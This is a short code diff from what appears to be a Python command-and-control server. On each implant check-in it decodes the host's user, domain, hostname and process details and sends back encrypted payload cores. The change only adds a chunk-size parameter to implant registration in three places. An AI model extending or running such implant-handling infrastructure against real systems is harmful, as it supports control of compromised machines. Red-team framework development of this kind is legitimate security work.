@@ -158,7 +158,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             user = User.decode("utf-8")
             if "\\" in user:
               user = user[user.index("\\") + 1:]
-            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), user, Hostname.decode("utf-8"), Arch, PID, Proxy)
+            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), user, Hostname.decode("utf-8"), Arch, PID, Proxy, ChunkSize)
             newImplant.save()
             newImplant.display()
             responseVal = encrypt(KEY, newImplant.SharpCore)
@@ -172,7 +172,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
             User,Domain,Hostname,Arch,PID,Proxy = decCookie.split(";")
-            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
+            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy, ChunkSize)
             newImplant.save()
             newImplant.display()
             responseVal = encrypt(KEY, newImplant.PythonCore)
@@ -190,7 +190,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               user = User.decode("utf-8")
               if "\\" in user:
                 user = user[user.index('\\') + 1:]
-              newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"),user, Hostname.decode("utf-8"), Arch, PID, Proxy)
+              newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"),user, Hostname.decode("utf-8"), Arch, PID, Proxy, ChunkSize)
               newImplant.save()
               newImplant.display()
               newImplant.autoruns()
